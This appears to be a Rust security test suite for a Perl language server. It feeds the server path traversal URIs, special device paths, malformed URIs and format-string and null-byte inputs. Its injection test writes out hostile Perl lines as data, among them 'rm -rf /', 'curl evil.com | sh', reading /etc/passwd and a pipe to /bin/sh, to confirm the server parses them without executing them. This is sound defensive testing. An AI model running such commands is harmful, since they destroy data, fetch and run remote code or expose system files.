use serde_json::json;

mod common;
use common::{initialize_lsp, read_response, send_notification, send_request, start_lsp_server};

/// Security and validation tests
/// Ensures the LSP server is secure and handles edge cases properly

#[test]
fn test_path_traversal_prevention() {
    let mut server = start_lsp_server();
    initialize_lsp(&mut server);

    // Try various path traversal attempts
    let malicious_uris = vec![
        "file:///../../../etc/passwd",
        "file:///test/../../sensitive.pl",
        "file:///test/%2e%2e%2f%2e%2e%2fpasswd",
        "file:///test/..\\..\\windows\\system32",
    ];

    for uri in malicious_uris {
        send_notification(
            &mut server,
            json!({
                "jsonrpc": "2.0",
                "method": "textDocument/didOpen",
                "params": {
                    "textDocument": {
                        "uri": uri,
                        "languageId": "perl",
                        "version": 1,
                        "text": "print 'test';"
                    }
                }
            }),
        );

        // Should handle safely
        send_request(
            &mut server,
            json!({
                "jsonrpc": "2.0",
                "id": 1,
                "method": "textDocument/documentSymbol",
                "params": {
                    "textDocument": {
                        "uri": uri
                    }
                }
            }),
        );

        let response = read_response(&mut server);
        assert!(response.is_object());
    }
}

#[test]
fn test_code_injection_prevention() {
    let mut server = start_lsp_server();
    initialize_lsp(&mut server);

    // Try to inject malicious code patterns
    let malicious_content = vec![
        "system('rm -rf /');\n",
        "exec('curl evil.com | sh');\n",
        "`cat /etc/passwd`;\n",
        "eval('unlink glob \"*\"');\n",
        "open(FH, '|/bin/sh');\n",
    ];

    for (i, content) in malicious_content.iter().enumerate() {
        send_notification(
            &mut server,
            json!({
                "jsonrpc": "2.0",
                "method": "textDocument/didOpen",
                "params": {
                    "textDocument": {
                        "uri": format!("file:///inject{}.pl", i),
                        "languageId": "perl",
                        "version": 1,
                        "text": content
                    }
                }
            }),
        );

        // Should parse without executing
        send_request(
            &mut server,
            json!({
                "jsonrpc": "2.0",
                "id": i + 1,
                "method": "textDocument/documentSymbol",
                "params": {
                    "textDocument": {
                        "uri": format!("file:///inject{}.pl", i)
                    }
                }
            }),
        );

        let response = read_response(&mut server);
        assert!(response.is_object());
    }
}

#[test]
fn test_null_byte_injection() {
    let mut server = start_lsp_server();
    initialize_lsp(&mut server);

    // Try null byte injection
    let content_with_null = "print 'before';\0print 'after';";

    send_notification(
        &mut server,
        json!({
            "jsonrpc": "2.0",
            "method": "textDocument/didOpen",
            "params": {
                "textDocument": {
                    "uri": "file:///null.pl",
                    "languageId": "perl",
                    "version": 1,
                    "text": content_with_null
                }
            }
        }),
    );

    // Should handle null bytes safely
    send_request(
        &mut server,
        json!({
            "jsonrpc": "2.0",
            "id": 1,
            "method": "textDocument/documentSymbol",
            "params": {
                "textDocument": {
                    "uri": "file:///null.pl"
                }
            }
        }),
    );

    let response = read_response(&mut server);
    assert!(response.is_object());
}

#[test]
fn test_format_string_vulnerability() {
    let mut server = start_lsp_server();
    initialize_lsp(&mut server);

    // Try format string attacks
    let format_attacks = vec![
        "printf('%s%s%s%s%s%s%s%s%s%s');\n",
        "sprintf($buf, '%n%n%n%n');\n",
        "printf('%x' x 100);\n",
    ];

    for (i, content) in format_attacks.iter().enumerate() {
        send_notification(
            &mut server,
            json!({
                "jsonrpc": "2.0",
                "method": "textDocument/didOpen",
                "params": {
                    "textDocument": {
                        "uri": format!("file:///format{}.pl", i),
                        "languageId": "perl",
                        "version": 1,
                        "text": content
                    }
                }
            }),
        );

        // Should parse safely
        send_request(
            &mut server,
            json!({
                "jsonrpc": "2.0",
                "id": i + 1,
                "method": "textDocument/hover",
                "params": {
                    "textDocument": {
                        "uri": format!("file:///format{}.pl", i)
                    },
                    "position": {
                        "line": 0,
                        "character": 0
                    }
                }
            }),
        );

        let response = read_response(&mut server);
        assert!(response.is_object());
    }
}

#[test]
fn test_integer_overflow_prevention() {
    let mut server = start_lsp_server();
    initialize_lsp(&mut server);

    // Try to cause integer overflow
    send_notification(
        &mut server,
        json!({
            "jsonrpc": "2.0",
            "method": "textDocument/didOpen",
            "params": {
                "textDocument": {
                    "uri": "file:///overflow.pl",
                    "languageId": "perl",
                    "version": 1,
                    "text": "my $x = 1;"
                }
            }
        }),
    );

    // Request with extreme positions
    send_request(
        &mut server,
        json!({
            "jsonrpc": "2.0",
            "id": 1,
            "method": "textDocument/hover",
            "params": {
                "textDocument": {
                    "uri": "file:///overflow.pl"
                },
                "position": {
                    "line": 2147483647,  // Max i32
                    "character": 2147483647
                }
            }
        }),
    );

    let response = read_response(&mut server);
    // Should handle gracefully without panic
    assert!(response.is_object());
}

#[test]
fn test_special_file_handling() {
    let mut server = start_lsp_server();
    initialize_lsp(&mut server);

    // Try to open special file URIs
    let special_uris = vec![
        "file:///dev/null",
        "file:///dev/random",
        "file:///proc/self/mem",
        "file:///:memory:",
        "file:///CON", // Windows special
        "file:///PRN", // Windows printer
    ];

    for uri in special_uris {
        send_notification(
            &mut server,
            json!({
                "jsonrpc": "2.0",
                "method": "textDocument/didOpen",
                "params": {
                    "textDocument": {
                        "uri": uri,
                        "languageId": "perl",
                        "version": 1,
                        "text": "print 'test';"
                    }
                }
            }),
        );

        // Should handle special files safely
        send_request(
            &mut server,
            json!({
                "jsonrpc": "2.0",
                "id": 1,
                "method": "textDocument/documentSymbol",
                "params": {
                    "textDocument": {
                        "uri": uri
                    }
                }
            }),
        );

        let response = read_response(&mut server);
        assert!(response.is_object());
    }
}

#[test]
fn test_protocol_confusion() {
    let mut server = start_lsp_server();
    initialize_lsp(&mut server);

    // Mix different protocol versions
    send_request(
        &mut server,
        json!({
            "jsonrpc": "1.0",  // Wrong version
            "id": 1,
            "method": "textDocument/hover",
            "params": {}
        }),
    );

    let response = read_response(&mut server);
    assert!(response.is_object());

    // Send without jsonrpc field
    send_request(
        &mut server,
        json!({
            "id": 2,
            "method": "textDocument/hover",
            "params": {}
        }),
    );

    let response = read_response(&mut server);
    assert!(response.is_object());
}

#[test]
fn test_resource_uri_validation() {
    let mut server = start_lsp_server();
    initialize_lsp(&mut server);

    // Various malformed URIs
    let bad_uris = vec![
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
        "ftp://evil.com/file.pl",
        "http://evil.com/file.pl",
        "file://[::1]/file.pl", // IPv6
        "",                     // Empty URI
        "file:",                // Incomplete
    ];

    for uri in bad_uris {
        send_notification(
            &mut server,
            json!({
                "jsonrpc": "2.0",
                "method": "textDocument/didOpen",
                "params": {
                    "textDocument": {
                        "uri": uri,
                        "languageId": "perl",
                        "version": 1,
                        "text": "print 'test';"
                    }
                }
            }),
        );

        // Should validate URI properly
        send_request(
            &mut server,
            json!({
                "jsonrpc": "2.0",
                "id": 1,
                "method": "textDocument/documentSymbol",
                "params": {
                    "textDocument": {
                        "uri": uri
                    }
                }
            }),
        );

        let response = read_response(&mut server);
        assert!(response.is_object());
    }
}

#[test]
fn test_encoding_edge_cases() {
    let mut server = start_lsp_server();
    initialize_lsp(&mut server);

    // Various encoding edge cases
    let encodings = vec![
        // UTF-8 with BOM
        "\u{FEFF}#!/usr/bin/perl\nprint 'BOM';",
        // Mixed line endings
        "print 'unix';\nprint 'windows';\r\nprint 'mac';\r",
        // Control characters
        "print 'test\x01\x02\x03';",
        // Surrogate pairs (invalid UTF-8)
        "my $str = 'test';", // Can't actually include invalid UTF-8 in source
        // Overlong encoding attempt
        "print 'normal';",
    ];

    for (i, content) in encodings.iter().enumerate() {
        send_notification(
            &mut server,
            json!({
                "jsonrpc": "2.0",
                "method": "textDocument/didOpen",
                "params": {
                    "textDocument": {
                        "uri": format!("file:///encoding{}.pl", i),
                        "languageId": "perl",
                        "version": 1,
                        "text": content
                    }
                }
            }),
        );

        // Should handle various encodings
        send_request(
            &mut server,
            json!({
                "jsonrpc": "2.0",
                "id": i + 1,
                "method": "textDocument/documentSymbol",
                "params": {
                    "textDocument": {
                        "uri": format!("file:///encoding{}.pl", i)
                    }
                }
            }),
        );

        let response = read_response(&mut server);
        assert!(response.is_object());
    }
}

#[test]
fn test_symlink_and_hardlink_handling() {
    let mut server = start_lsp_server();
    initialize_lsp(&mut server);

    // Open same content via different "paths"
    let content = "sub shared_function { return 42; }";

    // Simulate opening via symlink
    send_notification(
        &mut server,
        json!({
            "jsonrpc": "2.0",
            "method": "textDocument/didOpen",
            "params": {
                "textDocument": {
                    "uri": "file:///real/path/file.pl",
                    "languageId": "perl",
                    "version": 1,
                    "text": content
                }
            }
        }),
    );

    // Open "same" file via different path
    send_notification(
        &mut server,
        json!({
            "jsonrpc": "2.0",
            "method": "textDocument/didOpen",
            "params": {
                "textDocument": {
                    "uri": "file:///symlink/to/file.pl",
                    "languageId": "perl",
                    "version": 1,
                    "text": content
                }
            }
        }),
    );

    // Both should work independently
    send_request(
        &mut server,
        json!({
            "jsonrpc": "2.0",
            "id": 1,
            "method": "textDocument/documentSymbol",
            "params": {
                "textDocument": {
                    "uri": "file:///real/path/file.pl"
                }
            }
        }),
    );

    let response1 = read_response(&mut server);

    send_request(
        &mut server,
        json!({
            "jsonrpc": "2.0",
            "id": 2,
            "method": "textDocument/documentSymbol",
            "params": {
                "textDocument": {
                    "uri": "file:///symlink/to/file.pl"
                }
            }
        }),
    );

    let response2 = read_response(&mut server);

    assert!(response1["result"].is_array());
    assert!(response2["result"].is_array());
}

#[test]
fn test_permission_denied_simulation() {
    let mut server = start_lsp_server();
    initialize_lsp(&mut server);

    // Simulate files that might have permission issues
    let restricted_paths = vec![
        "file:///root/protected.pl",
        "file:///System/Library/secret.pl",
        "file:///Windows/System32/admin.pl",
    ];

    for path in restricted_paths {
        send_notification(
            &mut server,
            json!({
                "jsonrpc": "2.0",
                "method": "textDocument/didOpen",
                "params": {
                    "textDocument": {
                        "uri": path,
                        "languageId": "perl",
                        "version": 1,
                        "text": "print 'restricted';"
                    }
                }
            }),
        );

        // Should handle even if path suggests restricted access
        send_request(
            &mut server,
            json!({
                "jsonrpc": "2.0",
                "id": 1,
                "method": "textDocument/documentSymbol",
                "params": {
                    "textDocument": {
                        "uri": path
                    }
                }
            }),
        );

        let response = read_response(&mut server);
        assert!(response.is_object());
    }
}

#[test]
fn test_time_based_attacks() {
    let mut server = start_lsp_server();
    initialize_lsp(&mut server);

    // Try to detect timing differences (shouldn't exist)
    let valid_var = "my $valid = 42;";
    let invalid_var = "my $ = 42;"; // Invalid syntax

    // Open both documents
    send_notification(
        &mut server,
        json!({
            "jsonrpc": "2.0",
            "method": "textDocument/didOpen",
            "params": {
                "textDocument": {
                    "uri": "file:///valid.pl",
                    "languageId": "perl",
                    "version": 1,
                    "text": valid_var
                }
            }
        }),
    );

    send_notification(
        &mut server,
        json!({
            "jsonrpc": "2.0",
            "method": "textDocument/didOpen",
            "params": {
                "textDocument": {
                    "uri": "file:///invalid.pl",
                    "languageId": "perl",
                    "version": 1,
                    "text": invalid_var
                }
            }
        }),
    );

    // Measure timing for both
    let start_valid = std::time::Instant::now();
    send_request(
        &mut server,
        json!({
            "jsonrpc": "2.0",
            "id": 1,
            "method": "textDocument/documentSymbol",
            "params": {
                "textDocument": {
                    "uri": "file:///valid.pl"
                }
            }
        }),
    );
    let _ = read_response(&mut server);
    let time_valid = start_valid.elapsed();

    let start_invalid = std::time::Instant::now();
    send_request(
        &mut server,
        json!({
            "jsonrpc": "2.0",
            "id": 2,
            "method": "textDocument/documentSymbol",
            "params": {
                "textDocument": {
                    "uri": "file:///invalid.pl"
                }
            }
        }),
    );
    let _ = read_response(&mut server);
    let time_invalid = start_invalid.elapsed();

    // Times should be similar (no timing leak)
    let ratio = time_valid.as_micros() as f64 / time_invalid.as_micros().max(1) as f64;
    assert!(ratio > 0.1 && ratio < 10.0, "Timing ratio: {}", ratio);
}
